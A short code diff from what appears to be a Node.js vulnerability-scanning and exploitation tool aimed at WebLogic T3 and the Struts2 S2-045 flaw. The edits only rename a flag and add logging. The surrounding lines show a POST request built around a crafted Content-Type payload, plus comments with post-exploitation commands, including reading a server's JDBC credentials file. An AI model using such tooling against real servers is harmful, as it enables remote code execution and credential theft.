@@ -31,7 +31,7 @@ program.version(szMyName)
 	.option('-t, --t3', 'check weblogic t3,default false')
 	.option('-i, --install', 'install node modules,run: npm install')
 	.option('-v, --verbose', 'show logs')
-	.option('-u, --struts2 [value]', 'struts2 type,eg: 045')
+	.option('-w, --struts2 [value]', 'struts2 type,eg: 045')
 	.option('-C, --cmd [value]', 'cmd type,eg: "ping -c 3 www.baidu.com"')
 	.option('-o, --timeout', 'default ' + timeout)
 	.option('-l, --pool', 'default ' + g_nPool)
@@ -516,6 +516,7 @@ function doStruts2_045(url, fnCbk)
 	// ,"echo ls:;ls;echo pwd:;pwd;echo whoami:;whoami"
 	//  && cat #curPath/WEB-INF/jdbc.propertis
 	// if(/\/$/.test(url))url = url.substr(0, url.length - 1);
+	console.log(url);
 	request(fnOptHeader({method: 'POST',uri: url
 	    ,headers:
 	    {
@@ -524,6 +525,7 @@ function doStruts2_045(url, fnCbk)
 	    	"Content-Type":g_postData
 	    }})
 	  , function (error, response, body){
+
 	  		if(body)
 	  		{
 	  			// body = String(body).replace(/cmdend.*?$/gmi, "cmdend\n");
